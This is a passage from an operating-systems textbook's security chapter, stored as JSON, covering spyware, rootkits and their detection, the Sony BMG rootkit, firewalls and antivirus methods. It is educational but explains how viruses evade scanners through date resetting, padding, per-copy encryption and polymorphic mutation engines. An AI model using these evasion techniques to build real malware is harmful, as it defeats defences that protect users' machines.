too low, the spyware is automatically download\u0002ed and installed. The reason people set the security settings low is that when they\r\nare set high, many Websites do not display correctly (or at all) or IE is constantly\r\nasking permission for this and that, none of which the user understands.\r\nNow suppose the user has the security settings fairly high. When an infected\r\nWeb page is visited, IE detects the activeX control and pops up a dialog box that\r\ncontains a message provided by the Web page. It might say\r\nDo you want to install and run a program that will speed up your Internet access?\r\nMost people will think this is a good idea and click YES. Bingo. They’re history.\r\nSophisticated users may check out the rest of the dialog box, where they will find\r\ntwo other items. One is a link to the Web page’s certificate (as discussed in Sec.\r\n9.5) provided by some CA they hav e never heard of and which contains no useful\r\ninformation other than the fact that CA vouches that the company exists and had\r\nenough money to pay for the certificate. The other is a hyperlink to a different Web\r\npage provided by the Web page being visited. It is supposed to explain what the\r\nactiveX control does, but, in fact, it can be about anything and generally explains\r\nhow wonderful the activeX control is and how it will improve your surfing experi\u0002ence. Armed with this bogus information, even sophisticated users often click\r\nYES.\r\nIf they click NO, often a script on the Web page uses a bug in IE to try to\r\ndownload the spyware anyway. If no bug is available to exploit, it may just try to\r\ndownload the activeX control again and again and again, each time causing IE to\r\ndisplay the same dialog box. Most people do not know what to do at that point (go\r\nto the task manager and kill IE) so they eventually give up and click YES. See\r\nBingo above.\r\nOften what happens next is that the spyware displays a 20–30 page license\r\nagreement written in language that would have been familiar to Geoffrey Chaucer\nSEC. 9.9 MALWARE 679\r\nbut not to anyone subsequent to him outside the legal profession. Once the user has\r\naccepted the license, he may lose his right to sue the spyware vendor because he\r\nhas just agreed to let the spyware run amok, although sometimes local laws over\u0002ride such licenses. (If the license says ‘‘Licensee hereby irrevocably grants to\r\nlicensor the right to kill licensee’s mother and claim her inheritance’’ licensor may\r\nhave some trouble convincing the courts when he comes to collect, despite\r\nlicensee’s agreeing to the license.)\r\nActions Taken by Spyware\r\nNow let us look at what spyware typically does. All of the items in the list\r\nbelow are common.\r\n1. Change the browser’s home page.\r\n2. Modify the browser’s list of favorite (bookmarked) pages.\r\n3. Add new toolbars to the browser.\r\n4. Change the user’s default media player.\r\n5. Change the user’s default search engine.\r\n6. Add new icons to the Windows desktop.\r\n7. Replace banner ads on Web pages with those the spyware picks.\r\n8. Put ads in the standard Windows dialog boxes.\r\n9. Generate a continuous and unstoppable stream of pop-up ads.\r\nThe first three items change the browser’s behavior, usually in such a way that even\r\nrebooting the system does not restore the previous values. This attack is known as\r\nmild browser hijacking (mild, because there are even worse hijacks). The two\r\nitems change settings in the Windows registry, div erting the unsuspecting user to a\r\ndifferent media player (that displays the ads the spyware wants displayed) and a\r\ndifferent search engine (that returns Websites the spyware wants it to). Adding\r\nicons to the desktop is an obvious attempt to get the user to run newly installed\r\nsoftware. Replacing banner ads (468 × 60 .gif images) on subsequent Web pages\r\nmakes it look like all Web pages visited are advertising the sites the spyware\r\nchooses. But it is the last item that is the most annoying: a pop-up ad that can be\r\nclosed, but which generates another pop-up ad immediately ad infinitum with no\r\nway to stop them. Additionally, spyware sometimes disables the firewall, removes\r\ncompeting spyware, and carries out other malicious actions.\r\nMany spyware programs come with uninstallers, but they rarely work, so inex\u0002perienced users have no way to remove the spyware. Fortunately, a new industry of\r\nantispyware software is being created and existing antivirus firms are getting into\r\nthe act as well. Still the line between legitimate programs and spyware is blurry.\n680 SECURITY CHAP. 9\r\nSpyware should not be confused with adware, in which legitimate (but small)\r\nsoftware vendors offer two versions of their product: a free one with ads and a paid\r\none without ads. These companies are very clear about the existence of the two\r\nversions and always offer users the option to upgrade to the paid version to get rid\r\nof the ads."
          },
          "9.9.5 Rootkits": {
            "page": 711,
            "content": "9.9.5 Rootkits\r\nA rootkit is a program or set of programs and files that attempts to conceal its\r\nexistence, even in the face of determined efforts by the owner of the infected ma\u0002chine to locate and remove it. Usually, the rootkit contains some malware that is\r\nbeing hidden as well. Rootkits can be installed by any of the methods discussed so\r\nfar, including viruses, worms, and spyware, as well as by other ways, one of which\r\nwill be discussed later.\r\nTypes of Rootkits\r\nLet us now discuss the fiv e kinds of rootkits that are currently possible, from\r\nbottom to top. In all cases, the issue is: where does the rootkit hide?\r\n1. Firmware rootkits. In theory at least, a rootkit could hide by re\u0002flashing the BIOS with a copy of itself in there. Such a rootkit would\r\nget control whenever the machine was booted and also whenever a\r\nBIOS function was called. If the rootkit encrypted itself after each use\r\nand decrypted itself before each use, it would be quite hard to detect.\r\nThis type has not been observed in the wild yet.\r\n2. Hypervisor rootkits. An extremely sneaky kind of rootkit could run\r\nthe entire operating system and all the applications in a virtual ma\u0002chine under its control. The first proof-of-concept, blue pill (a refer\u0002ence to a movie called The Matrix), was demonstrated by a Polish\r\nhacker named Joanna Rutkowska in 2006. This kind of rootkit usual\u0002ly modifies the boot sequence so that when the machine is powered\r\non it executes the hypervisor on the bare hardware, which then starts\r\nthe operating system and its applications in a virtual machine. The\r\nstrength of this method, like the previous one, is that nothing is hid\u0002den in the operating system, libraries, or programs, so rootkit detec\u0002tors that look there will come up short.\r\n3. Kernel rootkits. The most common kind of rootkit at present is one\r\nthat infects the operating system and hides in it as a device driver or\r\nloadable kernel module. The rootkit can easily replace a large, com\u0002plex, and frequently changing driver with a new one that contains the\r\nold one plus the rootkit.\nSEC. 9.9 MALWARE 681\r\n4. Library rootkits. Another place a rootkit can hide is in the system\r\nlibrary, for example, in libc in Linux. This location gives the malware\r\nthe opportunity to inspect the arguments and return values of system\r\ncalls, modifying them as need be to keep itself hidden.\r\n5. Application rootkits. Another place to hide a rootkit is inside a large\r\napplication program, especially one that creates many new files while\r\nrunning (user profiles, image previews, etc.). These new files are\r\ngood places to hide things, and no one thinks it strange that they exist.\r\nThe fiv e places rootkits can hide are illustrated in Fig. 9-31.\r\n(b) (c)\r\nOperating\r\nsystem\r\nOperating\r\nsystem Operating\r\nsystem\r\nOperating\r\nsystem\r\nOperating\r\nsystem\r\nLibrary\r\nApp.\r\n(a)\r\nHW\r\nLibrary\r\nApp.\r\nHypervisor\r\nHW (BIOS)\r\nLibrary\r\nApp.\r\nHW (BIOS)\r\n(d)\r\nLibrary\r\nApp.\r\nHW (BIOS)\r\n(e)\r\nLibrary\r\nApp.\r\nHW (BIOS)\r\nFigure 9-31. Five places a rootkit can hide.\r\nRootkit Detection\r\nRootkits are hard to detect when the hardware, operating system, libraries, and\r\napplications cannot be trusted. For example, an obvious way to look for a rootkit is\r\nto make listings of all the files on the disk. However, the system call that reads a\r\ndirectory, the library procedure that calls this system call, and the program that\r\ndoes the listing are all potentially malicious and might censor the results, omitting\r\nany files relating to the rootkit. Nevertheless, the situation is not hopeless, as de\u0002scribed below.\r\nDetecting a rootkit that boots its own hypervisor and then runs the operating\r\nsystem and all applications in a virtual machine under its control is tricky, but not\r\nimpossible. It requires carefully looking for minor discrepancies in performance\r\nand functionality between a virtual machine and a real one. Garfinkel et al. (2007)\r\nhave suggested several of them, as described below. Carpenter et al. (2007) also\r\ndiscuss this subject.\r\nOne whole class of detection methods relies on the fact that hypervisor itself\r\nuses physical resources and the loss of these resources can be detected. For ex\u0002ample, the hypervisor itself needs to use some TLB entries, competing with the\r\nvirtual machine for these scarce resources. A detection program could put pressure\n682 SECURITY CHAP. 9\r\non the TLB, observe the performance, and compare it to previously measured per\u0002formance on the bare hardware.\r\nAnother class of detection methods relates to timing, especially of virtualized\r\nI/O devices. Suppose that it takes 100 clock cycles to read out some PCI device\r\nregister on the real machine and this time is highly reproducible. In a virtual envi\u0002ronment, the value of this register comes from memory, and its read time depends\r\non whether it is in the CPU’s lev el 1 cache, level 2 cache, or actual RAM. A detec\u0002tion program could easily force it to move back and forth between these states and\r\nmeasure the variability in read times. Note that it is the variability that matters, not\r\nthe read time.\r\nAnother area that can be probed is the time it takes to execute privileged in\u0002structions, especially those that require only a few clock cycles on the real hard\u0002ware and hundreds or thousands of clock cycles when they must be emulated. For\r\nexample, if reading out some protected CPU register takes 1 nsec on the real hard\u0002ware, there is no way a billion traps and emulations can be done in 1 sec. Of\r\ncourse, the hypervisor can cheat by reporting emulated time instead of real time on\r\nall system calls involving time. The detector can bypass the emulated time by con\u0002necting to a remote machine or Website that provides an accurate time base. Since\r\nthe detector just needs to measure time intervals (e.g., how long it takes to execute\r\na billion reads of a protected register), skew between the local clock and the remote\r\nclock does not matter.\r\nIf no hypervisor has been slipped between the hardware and the operating sys\u0002tem, then the rootkit might be hiding inside the operating system. It is difficult to\r\ndetect it by booting the computer since the operating system cannot be trusted. For\r\nexample, the rootkit might install a large number of files, all of whose names begin\r\nwith ‘‘$$$ ’’ and when reading directories on behalf of user programs, never report\r\nthe existence of such files.\r\nOne way to detect rootkits under these circumstances is to boot the computer\r\nfrom a trusted external medium such as the original DVD or USB stick. Then the\r\ndisk can be scanned by an antirootkit program without fear that the rootkit itself\r\nwill interfere with the scan. Alternatively, a cryptographic hash can be made of\r\neach file in the operating system and these compared to a list made when the sys\u0002tem was installed and stored outside the system where it could not be tampered\r\nwith. Alternatively, if no such hashes were made originally, they can be computed\r\nfrom the installation USB or CD-ROM/DVD now, or the files themselves just com\u0002pared.\r\nRootkits in libraries and application programs are harder to hide, but if the op\u0002erating system has been loaded from an external medium and can be trusted, their\r\nhashes can also be compared to hashes known to be good and stored on a USB or\r\nCD-ROM.\r\nSo far, the discussion has been about passive rootkits, which do not interfere\r\nwith the rootkit-detection software. There are also active rootkits, which search out\r\nand destroy the rootkit detection software, or at least modify it to always announce:\nSEC. 9.9 MALWARE 683\r\n‘‘NO ROOTKITS FOUND!’’ These require more complicated measures, but fortu\u0002nately no active rootkits have appeared in the wild yet.\r\nThere are two schools of thought about what to do after a rootkit has been\r\ndiscovered. One school says the system administrator should behave like a surgeon\r\ntreating a cancer: cut it out very carefully. The other says trying to remove the\r\nrootkit is too dangerous. There may be pieces still hidden away. In this view, the\r\nonly solution is to revert to the last complete backup known to be clean. If no\r\nbackup is available, a fresh install is required.\r\nThe Sony Rootkit\r\nIn 2005, Sony BMG released a number of audio CDs containing a rootkit. It\r\nwas discovered by Mark Russinovich (cofounder of the Windows admin tools\r\nWebsite www.sysinternals.com), who was then working on developing a rootkit\r\ndetector and was most surprised to find a rootkit on his own system. He wrote\r\nabout it on his blog and soon the story was all over the Internet and the mass\r\nmedia. Scientific papers were written about it (Arnab and Hutchison, 2006; Bishop\r\nand Frincke, 2006; Felten and Halderman, 2006; Halderman and Felten, 2006; and\r\nLevine et al., 2006). It took years for the resulting furor to die down. Below we\r\nwill give a quick description of what happened.\r\nWhen a user inserts a CD in the drive on a Windows computer, Windows looks\r\nfor a file called autorun.inf, which contains a list of actions to take, usually starting\r\nsome program on the CD (such as an installation wizard). Normally, audio CDs do\r\nnot have these files since stand-alone CD players ignore them if present. Appar\u0002ently some genius at Sony thought that he would cleverly stop music piracy by put\u0002ting an autorun.inf file on some of its CDs, which when inserted into a computer\r\nimmediately and silently installed a 12-MB rootkit. Then a license agreement was\r\ndisplayed, which did not mention anything about software being installed. While\r\nthe license was being displayed, Sony’s software checked to see if any of 200\r\nknown copy programs were running, and if so commanded the user to stop them.\r\nIf the user agreed to the license and stopped all copy programs, the music would\r\nplay; otherwise it would not. Even in the event the user declined the license, the\r\nrootkit remained installed.\r\nThe rootkit worked as follows. It inserted into the Windows kernel a number\r\nof files whose names began with $sys$. One of these was a filter that intercepted\r\nall system calls to the CD-ROM drive and prohibited all programs except Sony’s\r\nmusic player from reading the CD. This action made copying the CD to the hard\r\ndisk (which is legal) impossible. Another filter intercepted all calls that read file,\r\nprocess, and registry listings and deleted all entries starting with $sys$ (even from\r\nprograms completely unrelated to Sony and music) in order to cloak the rootkit.\r\nThis approach is fairly standard for newbie rootkit designers.\r\nBefore Russinovich discovered the rootkit, it had already been installed widely,\r\nnot entirely surprising since it was on over 20 million CDs. Dan Kaminsky (2006)\n684 SECURITY CHAP. 9\r\nstudied the extent and discovered that computers on over 500,000 networks world\u0002wide had been infected by the rootkit.\r\nWhen the news broke, Sony’s initial reaction was that it had every right to pro\u0002tect its intellectual property. In an interview on National Public Radio, Thomas\r\nHesse, the president of Sony BMG’s global digital business, said: ‘‘Most people, I\r\nthink, don’t even know what a rootkit is, so why should they care about it?’’ When\r\nthis response itself provoked a firestorm, Sony backtracked and released a patch\r\nthat removed the cloaking of $sys$ files but kept the rootkit in place. Under\r\nincreasing pressure, Sony eventually released an uninstaller on its Website, but to\r\nget it, users had to provide an email address, and agree that Sony could send them\r\npromotional material in the future (what most people call spam).\r\nAs the story continued to play out, it emerged that Sony’s uninstaller contained\r\ntechnical flaws that made the infected computer highly vulnerable to attacks over\r\nthe Internet. It was also revealed that the rootkit contained code from open source\r\nprojects in violation of their copyrights (which permitted free use of the software\r\nprovided that the source code is released).\r\nIn addition to an unparalleled public relations disaster, Sony faced legal jeop\u0002ardy, too. The state of Texas sued Sony for violating its antispyware law as well as\r\nfor violating its deceptive trade practices law (because the rootkit was installed\r\nev en if the license was declined). Class-action suits were later filed in 39 states. In\r\nDecember 2006, these suits were settled when Sony agreed to pay $4.25 million, to\r\nstop including the rootkit on future CDs, and to give each victim the right to down\u0002load three albums from a limited music catalog. On January 2007, Sony admitted\r\nthat its software also secretly monitored users’ listening habits and reported them\r\nback to Sony, in violation of U.S. law. In a settlement with the FTC, Sony agreed\r\nto pay people whose computers were damaged by its software $150.\r\nThe Sony rootkit story has been provided for the benefit of any readers who\r\nmight have been thinking that rootkits are an academic curiosity with no real-world\r\nimplications. An Internet search for ‘‘Sony rootkit’’ will turn up a wealth of addi\u0002tional information."
          }
        }
      },
      "9.10 DEFENSES": {
        "page": 715,
        "children": {
          "9.10.1 Firewalls": {
            "page": 716,
            "content": "9.10.1 Firewalls\r\nThe ability to connect any computer, anywhere, to any other computer, any\u0002where, is a mixed blessing. While there is a lot of valuable material on the Web,\r\nbeing connected to the Internet exposes a computer to two kinds of dangers: in\u0002coming and outgoing. Incoming dangers include crackers trying to enter the com\u0002puter as well as viruses, spyware, and other malware. Outgoing dangers include\r\nconfidential information such as credit card numbers, passwords, tax returns, and\r\nall kinds of corporate information getting out.\r\nConsequently, mechanisms are needed to keep ‘‘good’’ bits in and ‘‘bad’’ bits\r\nout. One approach is to use a firewall, which is just a modern adaptation of that\r\nold medieval security standby: digging a deep moat around your castle. This design\r\nforced everyone entering or leaving the castle to pass over a single drawbridge,\r\nwhere they could be inspected by the I/O police. With networks, the same trick is\r\npossible: a company can have many LANs connected in arbitrary ways, but all traf\u0002fic to or from the company is forced through an electronic drawbridge, the firewall.\r\nFirewalls come in two basic varieties: hardware and software. Companies with\r\nLANs to protect usually opt for hardware firewalls; individuals at home frequently\r\nchoose software firewalls. Let us look at hardware firewalls first. A generic hard\u0002ware firewall is illustrated in Fig. 9-32. Here the connection (cable or optical fiber)\r\nfrom the network provider is plugged into the firewall, which is connected to the\r\nLAN. No packets can enter or exit the LAN without being approved by the fire\u0002wall. In practice, firewalls are often combined with routers, network address trans\u0002lation boxes, intrusion detection systems, and other things, but our focus here will\r\nbe on the firewall functionality.\r\n207.68.160.190:80 207.68.160.191:25 207.68.160.192:21\r\nWeb\r\nserver\r\nEmail\r\nserver\r\nFTP\r\nserver Firewall\r\nLocal area network\r\nNetwork\r\nconnection\r\nFigure 9-32. A simplified view of a hardware firewall protecting a LAN with\r\nthree computers.\r\nFirewalls are configured with rules describing what is allowed in and what is\r\nallowed out. The owner of the firewall can change the rules, commonly via a Web\n686 SECURITY CHAP. 9\r\ninterface (most firewalls have a mini-Web server built in to allow this). In the sim\u0002plest kind of firewall, the stateless firewall, the header of each packet passing\r\nthrough is inspected and a decision is made to pass or discard the packet based\r\nsolely on the information in the header and the firewall’s rules. The information in\r\nthe packet header includes the source and destination IP addresses, source and\r\ndestination ports, type of service and protocol. Other fields are available, but rarely\r\noccur in the rules.\r\nIn the example of Fig. 9-32 we see three servers, each with a unique IP address\r\nof the form 207.68.160.x, where x is 190, 191, and 192, respectively. These are the\r\naddresses to which packets must be sent to get to these servers. Incoming packets\r\nalso contain a 16-bit port number, which specifies which process on the machine\r\ngets the packet (a process can listen on a port for incoming traffic). Some ports\r\nhave standard services associated with them. In particular, port 80 is used for the\r\nWeb, port 25 is used for email, and port 21 is used for FTP (file transfer) service,\r\nbut most of the others are available for user-defined services. Under these condi\u0002tions, the firewall might be configured as follows:\r\nIP address Port Action\r\n207.68.160.190 80 Accept\r\n207.68.160.191 25 Accept\r\n207.68.160.192 21 Accept\r\n* * Deny\r\nThese rules allow packets to go to machine 207.68.160.190, but only if they are ad\u0002dressed to port 80; all other ports on this machine are disallowed and packets sent\r\nto them will be silently discarded by the firewall. Similarly, packets can go to the\r\nother two servers if addressed to ports 25 and 21, respectively. All other traffic is\r\ndiscarded. This ruleset makes it hard for an attacker to get any access to the LAN\r\nexcept for the three public services being offered.\r\nDespite the firewall, it is still possible to attack the LAN. For example, if the\r\nWeb server is apache and the cracker has discovered a bug in apache that can be\r\nexploited, he might be able to send a very long URL to 207.68.160.190 on port 80\r\nand force a buffer overflow, thus taking over one of the machines inside the fire\u0002wall, which could then be used to launch an attack on other machines on the LAN.\r\nAnother potential attack is to write and publish a multiplayer game and get it\r\nwidely accepted. The game software needs some port to connect to other players,\r\nso the game designer may select one, say, 9876, and tell the players to change their\r\nfirewall settings to allow incoming and outgoing traffic on this port. People who\r\nhave opened this port are now subject to attacks on it, which may be easy especial\u0002ly if the game contains a Trojan horse that accepts certain commands from afar and\r\njust runs them blindly. But even if the game is legitimate, it might contain poten\u0002ially exploitable bugs. The more ports are open, the greater the chance of an attack\r\nsucceeding. Every hole increases the odds of an attack getting through.\nSEC. 9.10 DEFENSES 687\r\nIn addition to stateless firewalls, there are also stateful firewalls, which keep\r\ntrack of connections and what state they are in. These firewalls are better at defeat\u0002ing certain kinds of attacks, especially those relating to establishing connections.\r\nYet other kinds of firewalls implement an IDS (Intrusion Detection System), in\r\nwhich the firewall inspects not only the packet headers, but also the packet con\u0002tents, looking for suspicious material.\r\nSoftware firewalls, sometimes called personal firewalls, do the same thing as\r\nhardware firewalls, but in software. They are filters that attach to the network code\r\ninside the operating system kernel and filter packets the same way the hardware\r\nfirewall does."
          },
          "9.10.2 Antivirus and Anti-Antivirus Techniques": {
            "page": 718,
            "content": "9.10.2 Antivirus and Anti-Antivirus Techniques\r\nFirewalls try to keep intruders out of the computer, but they can fail in various\r\nways, as described above. In that case, the next line of defense comprises the anti\u0002malware programs, often called antivirus programs, although many of them also\r\ncombat worms and spyware. Viruses try to hide and users try to find them, which\r\nleads to a cat-and-mouse game. In this respect, viruses are like rootkits, except that\r\nmost virus writers emphasize rapid spread of the virus rather than playing hide\u0002and-seek down in the weeds as rootkits do. Let us now look at some of the techni\u0002ques used by antivirus software and also how Virgil the virus writer responds to\r\nthem.\r\nVirus Scanners\r\nClearly, the average garden-variety user is not going to find many viruses that\r\ndo their best to hide, so a market has developed for antivirus software. Below we\r\nwill discuss how this software works. Antivirus software companies have laborato\u0002ries in which dedicated scientists work long hours tracking down and under\u0002standing new viruses. The first step is to have the virus infect a program that does\r\nnothing, often called a goat file, to get a copy of the virus in its purest form. The\r\nnext step is to make an exact listing of the virus’ code and enter it into the database\r\nof known viruses. Companies compete on the size of their databases. Inventing\r\nnew viruses just to pump up your database is not considered sporting.\r\nOnce an antivirus program is installed on a customer’s machine, the first thing\r\nit does is scan every executable file on the disk looking for any of the viruses in the\r\ndatabase of known viruses. Most antivirus companies have a Website from which\r\ncustomers can download the descriptions of newly discovered viruses into their\r\ndatabases. If the user has 10,000 files and the database has 10,000 viruses, some\r\nclever programming is needed to make it go fast, of course.\r\nSince minor variants of known viruses pop up all the time, a fuzzy search is\r\nneeded, to ensure that a 3-byte change to a virus does not let it escape detection.\r\nHowever, fuzzy searches are not only slower than exact searches, but they may turn\n688 SECURITY CHAP. 9\r\nup false alarms (false positives), that is, warnings about legitimate files that just\r\nhappen to contain some code vaguely similar to a virus reported in Pakistan 7 years\r\nago. What is the user supposed to do with the message:\r\nWARNING! File xyz.exe may contain the lahore-9x virus. Delete?\r\nThe more viruses in the database and the broader the criteria for declaring a hit, the\r\nmore false alarms there will be. If there are too many, the user will give up in dis\u0002gust. But if the virus scanner insists on a very close match, it may miss some mod\u0002ified viruses. Getting it right is a delicate heuristic balance. Ideally, the lab should\r\ntry to identify some core code in the virus that is not likely to change and use this\r\nas the virus signature to scan for.\r\nJust because the disk was declared virus free last week does not mean that it\r\nstill is, so the virus scanner has to be run frequently. Because scanning is slow, it is\r\nmore efficient to check only those files that have been changed since the date of the\r\nlast scan. The trouble is, a clever virus will reset the date of an infected file to its\r\noriginal date to avoid detection. The antivirus program’s response to that is to\r\ncheck the date the enclosing directory was last changed. The virus’ response to that\r\nis to reset the directory’s date as well. This is the start of the cat-and-mouse game\r\nalluded to above.\r\nAnother way for the antivirus program to detect file infection is to record and\r\nstore on the disk the lengths of all files. If a file has grown since the last check, it\r\nmight be infected, as shown in Fig. 9-33(a–b). However, a really clever virus can\r\navoid detection by compressing the program and padding out the file to its original\r\nlength to try to blend in. To make this scheme work, the virus must contain both\r\ncompression and decompression procedures, as shown in Fig. 9-33(c). Another\r\nway for the virus to try to escape detection is to make sure its representation on the\r\ndisk does not look like its representation in the antivirus software’s database. One\r\nway to achieve this goal is to encrypt itself with a different key for each file infect\u0002ed. Before making a new copy, the virus generates a random 32-bit encryption key,\r\nfor example by XORing the current time of day with the contents of, for example,\r\nmemory words 72,008 and 319,992. It then XORs its code with this key, word by\r\nword, to produce the encrypted virus stored in the infected file, as illustrated in\r\nFig. 9-33(d). The key is stored in the file. For secrecy purposes, putting the key in\r\nthe file is not ideal, but the goal here is to foil the virus scanner, not prevent the\r\ndedicated scientists at the antivirus lab from reverse engineering the code. Of\r\ncourse, to run, the virus has to first decrypt itself, so it needs a decrypting function\r\nin the file as well.\r\nThis scheme is still not perfect because the compression, decompression, en\u0002cryption, and decryption procedures are the same in all copies, so the antivirus pro\u0002gram can just use them as the virus signature to scan for. Hiding the compression,\r\ndecompression, and encryption procedures is easy: they are just encrypted along\r\nwith the rest of the virus, as shown in Fig. 9-33(e). The decryption code cannot be\r\nencrypted, however. It has to actually execute on the hardware to decrypt the rest\nSEC. 9.10 DEFENSES 689\r\n\r\n(a)\r\nExecutable\r\nprogram\r\nHeader\r\n(b)\r\nExecutable\r\nprogram\r\nHeader\r\n(c)\r\nDecompressor\r\nCompressor\r\nCompressed\r\nexecutable\r\nprogram\r\nCompressed\r\nexecutable\r\nprogram\r\nHeader\r\n(d)\r\nDecryptor\r\nHeader\r\nEncryptor\r\nCompressor\r\nEncrypted\r\nVirus\r\nDecompressor\r\nCompressed\r\nexecutable\r\nprogram\r\nEncryptor\r\nCompressor\r\nEncrypted\r\nVirus\r\nDecompressor\r\n(e)\r\nHeader\r\nFile is longer \r\nVirus Original size\r\nVirus\r\nOriginal size Original size\r\nEncrypted\r\nKey\r\nDecryptor\r\nKey\r\nUnused\r\nFigure 9-33. (a) A program. (b) An infected program. (c) A compressed infected\r\nprogram. (d) An encrypted virus. (e) A compressed virus with encrypted com\u0002pression code.\r\nof the virus, so it must be present in plaintext. Antivirus programs know this, so\r\nthey hunt for the decryption procedure.\r\nHowever, Virgil enjoys having the last word, so he proceeds as follows. Sup\u0002pose that the decryption procedure needs to perform the calculation\r\nX = (A + B + C − 4)\r\nThe straightforward assembly code for this calculation for a generic two-address\r\ncomputer is shown in Fig. 9-34(a). The first address is the source; the second is\r\nthe destination, so MOV A,R1 moves the variable A to the register R1. The code in\r\nFig. 9-34(b) does the same thing, only less efficiently due to the NOP (no opera\u0002tion) instructions interspersed with the real code.\r\nBut we are not done yet. It is also possible to disguise the decryption code.\r\nThere are many ways to represent NOP. For example, adding 0 to a register, ORing\r\nit with itself, shifting it left 0 bits, and jumping to the next instruction all do noth\u0002ing. Thus the program of Fig. 9-34(c) is functionally the same as the one of\r\nFig. 9-34(a). When copying itself, the virus could use Fig. 9-34(c) instead of\r\nFig. 9-34(a) and still work later when executed. A virus that mutates on each copy\r\nis called a polymorphic virus.\r\nNow suppose that R5 is not needed for anything during the execution of this\r\npiece of the code. Then Fig. 9-34(d) is also equivalent to Fig. 9-34(a). Finally, in\r\nmany cases it is possible to swap instructions without changing what the program\r\ndoes, so we end up with Fig. 9-34(e) as another code fragment that is logically e\u0002quivalent to Fig. 9-34(a). A piece of code that can mutate a sequence of machine\n690 SECURITY CHAP. 9\r\nMOV A,R1 MOV A,R1 MOV A,R1 MOV A,R1 MOV A,R1\r\nADD B,R1 NOP ADD #0,R1 OR R1,R1 TST R1\r\nADD C,R1 ADD B,R1 ADD B,R1 ADD B,R1 ADD C,R1\r\nSUB #4,R1 NOP OR R1,R1 MOV R1,R5 MOV R1,R5\r\nMOV R1,X ADD C,R1 ADD C,R1 ADD C,R1 ADD B,R1\r\nNOP SHL #0,R1 SHL R1,0 CMP R2,R5\r\nSUB #4,R1 SUB #4,R1 SUB #4,R1 SUB #4,R1\r\nNOP JMP .+1 ADD R5,R5 JMP .+1\r\nMOV R1,X MOV R1,X MOV R1,X MOV R1,X\r\nMOV R5,Y MOV R5,Y\r\n(a) (b) (c) (d) (e)\r\nFigure 9-34. Examples of a polymorphic virus.\r\ninstructions without changing its functionality is called a mutation engine, and\r\nsophisticated viruses contain them to mutate the decryptor from copy to copy.\r\nMutations can consist of inserting useless but harmless code, permuting instruc\u0002tions, swapping registers, and replacing an instruction with an equivalent one. The\r\nmutation engine itself can be hidden by encrypting it along with the payload.\r\nAsking the poor antivirus software to understand that Fig. 9-34(a) through\r\nFig. 9-34(e) are all functionally equivalent is asking a lot, especially if the mutation\r\nengine has many tricks up its sleeve. The antivirus software can analyze the code to\r\nsee what it does, and it can even try to simulate the operation of the code, but\r\nremember it may have thousands of viruses and thousands of files to analyze, so it\r\ndoes not have much time per test or it will run horribly slowly.\r\nAs an aside, the store into the variable Y was thrown in just to make it harder to\r\ndetect the fact that the code related to R5 is dead code, that is, does not do any\u0002thing. If other code fragments read and write Y, the code will look perfectly legiti\u0002mate. A well-written mutation engine that generates good polymorphic code can\r\ngive antivirus software writers nightmares. The only bright side is that such an\r\nengine is hard to write, so Virgil’s friends all use his code, which means there are\r\nnot so many different ones in circulation—yet.\r\nSo far we have talked about just trying to recognize viruses in infected ex\u0002ecutable files. In addition, the antivirus scanner has to check the MBR, boot sec\u0002tors, bad-sector list, flash memory, CMOS memory, and more, but what if there is a\r\nmemory-resident virus currently running? That will not be detected. Worse yet,\r\nsuppose the running virus is monitoring all system calls. It can easily detect that\r\nthe antivirus program is reading the boot sector (to check for viruses). To thwart\r\nthe antivirus program, the virus does not make the system call. Instead it just re\u0002turns the true boot sector from its hiding place in the bad-block list. It also makes\r\na mental note to reinfect all the files when the virus scanner is finished.\r\nTo prevent being spoofed by a virus, the antivirus program could make hard\r\nreads to the disk, bypassing the operating system. However, this requires having\nSEC. 9.10 DEFENSES 691\r\nbuilt-in device drivers for SATA, USB, SCSI, and other common disks, making the\r\nantivirus program less portable and subject to failure on computers with unusual\r\ndisks. Furthermore, since bypassing the operating system to read the boot sector is\r\npossible, but bypassing it to read all the executable files is not, there is also some\r\ndanger that the virus can produce fraudulent data about executable files.\r\nIntegrity Checkers\r\nA completely different approach to virus detection is integrity checking. An\r\nantivirus program that works this way first scans the hard disk for viruses. Once it\r\nis convinced that the disk is clean, it computes a checksum for each executable file.\r\nThe checksum algorithm could be something as simple as treating all the words in\r\nthe program text as 32- or 64-bit integers and adding them up, but it also can be a\r\ncryptographic hash that is nearly impossible to invert. It then writes the list of\r\nchecksums for all the relevant files in a directory to a file, checksum, in that direc\u0002tory. The next time it runs, it recomputes all the checksums and sees if they match\r\nwhat is in the file checksum. An infected file will show up immediately.\r\nThe trouble is that Virgil is not going to take this lying down. He can write a\r\nvirus that removes the checksum file. Worse yet, he can write a virus that com\u0002putes the checksum of the infected file and replaces the old entry in the checksum\r\nfile. To protect against this kind of behavior, the antivirus program can try to hide\r\nthe checksum file, but that is not likely to work since Virgil can study the antivirus\r\nprogram carefully before writing the virus. A better idea is to sign it digitally to\r\nmake tampering easy to detect. Ideally, the digital signature should involve use of\r\na smart card with an externally stored key that programs cannot get at.\r\nBehavioral Checkers\r\nA third strategy used by antivirus software is behavioral checking. With this\r\napproach, the antivirus program lives in memory while the computer is running\r\nand catches all system calls itself. The idea is that it can then monitor all activity\r\nand try to catch anything that looks suspicious. For example, no normal program\r\nshould attempt to overwrite the boot sector, so an attempt to do so is almost cer\u0002tainly due to a virus. Likewise, changing the flash memory is highly suspicious.\r\nBut there are also cases that are less clear cut. For example, overwriting an ex\u0002ecutable file is a peculiar thing to do—unless you are a compiler. If the antivirus\r\nsoftware detects such a write and issues a warning, hopefully the user knows\r\nwhether overwriting an executable makes sense in the context of the current work.\r\nSimilarly, Word overwriting a .docx file with a new document full of macros is not\r\nnecessarily the work of a virus. In Windows, programs can detach from their ex\u0002ecutable file and go memory resident using a special system call. Again, this might\r\nbe legitimate, but a warning might still be useful.\n692 SECURITY CHAP. 9\r\nViruses do not have to passively lie around waiting for an antivirus program to\r\nkill them, like cattle being led off to slaughter. They can fight back. A particularly\r\nexciting battle can occur if a memory-resident virus and a memory-resident\r\nantivirus meet up on the same computer. Years ago there was a game called Core\r\nWars in which two programmers faced off by each dropping a program into an\r\nempty address space. The programs took turns probing memory, with the object of\r\nthe game being to locate and wipe out your opponent before he wiped you out. The\r\nvirus-antivirus confrontation looks a little like that, only the battlefield is the ma\u0002chine of some poor user who does not really want it to happen there. Worse yet, the\r\nvirus has an advantage because its writer can find out a lot about the antivirus pro\u0002gram by just buying a copy of it. Of course, once the virus is out there, the\r\nantivirus team can modify their program, forcing Virgil to go buy a new copy.\r\nVirus Avoidance\r\nEvery good story needs a moral. The moral of this one is\r\nBetter safe than sorry.\r\nAv oiding viruses in the first place is a lot easier than 